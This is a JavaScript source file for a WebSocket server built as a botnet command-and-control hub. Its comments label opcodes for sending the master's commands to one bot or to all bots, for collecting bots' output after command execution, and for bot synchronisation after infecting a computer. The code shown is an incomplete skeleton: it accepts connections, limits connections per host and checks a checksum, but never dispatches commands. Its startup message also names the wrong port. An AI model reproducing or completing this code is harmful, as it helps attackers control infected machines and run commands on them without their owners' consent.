const WebSockets = require('websocket');
const http = require('http');

const server = http.createServer((req, res) => { res.writeHead(403).end(); });

server.listen(1234, function () {
  console.log((new Date()) + ' Server is listening on port 8080');
});

const WebSockServer = new WebSockets.server({
  httpServer: server,
  maxReceivedFrameSize: 65536,
  maxReceivedMessageSize: 65536
});

const MaxSingleHostsConnections = 1;
const BotnetCommandControls = [
  '\x23\x1a\x20\x17', //Master's command to specific bot
  '\x27\x1c\x24\x19', //Master's command to all bots
  '\xff\x1c\xfe\x1b', //Bot retrieving data after command execution
  '\x9b\x1c\x66\x19', //Bot synchronize sequence (after infect computer)
  '\x9b\x9b\x9d\xff'  //Master's forwarded command
];

var OpennedSockets    = 0;
var MaxOpennedSockets = 16;
var SocketTable       = [];


function is_origin_allowed(origin) {
  return true;
}

function wsccbsum(m) {
  if (m.length < 4)
    return false;
  let s1 = m.charCodeAt(0);
  let s2 = m.charCodeAt(1);
  let e1 = m.charCodeAt(m.length-2);
  let e2 = m.charCodeAt(m.length-1);
  return (s1 % (e1 + 1) == s2 % (e2 + 1));
}

WebSockServer.on('connect', (connection) => {
  OpennedSockets++;
  connection.on('message', (message) => {
    if (message.type == 'utf8'){
      let buffer = message.utf8Data;
      if (!wsccbsum(buffer))
        connection.drop(403, 'Invalid buffer received');
      
    } else {
      connection.drop(403, 'Invalid buffer received');
    }
  });
});

WebSockServer.on('request', (request) => {
  (is_origin_allowed(request.origin) ? () => { 
    if (OpennedSockets == MaxOpennedSockets){
      request.reject(503, 'Maximum concurrent socket connections limit hit');
    } 
    else {
      let NumOfConnections = 0;
      for (let scki = 0; scki < SocketTable.length; scki++){
        if ((SocketTable[scki].connected == true) && (SocketTable[scki].remoteAddress == request.remoteAddress)){
          NumOfConnections++;
        }
      }
      if (NumOfConnections < MaxSingleHostsConnections){
        SocketTable.push(request.accept());
      } else {
        request.reject(403, 'Maximum concurrent single hosts connections limit hit'); 
      }
    }
  } : () => { 
    request.reject(403, 'Access Denied'); 
  })();
});

WebSockServer.on('close', (connection, reasonCode, desc) => {
  SocketTable = SocketTable.filter((sock, _idx, _socktable) => {
    return !((sock.remoteAddress == connection.remoteAddress) || (sock == connection));
  });
  if (OpennedSockets > 0)
    OpennedSockets--;
});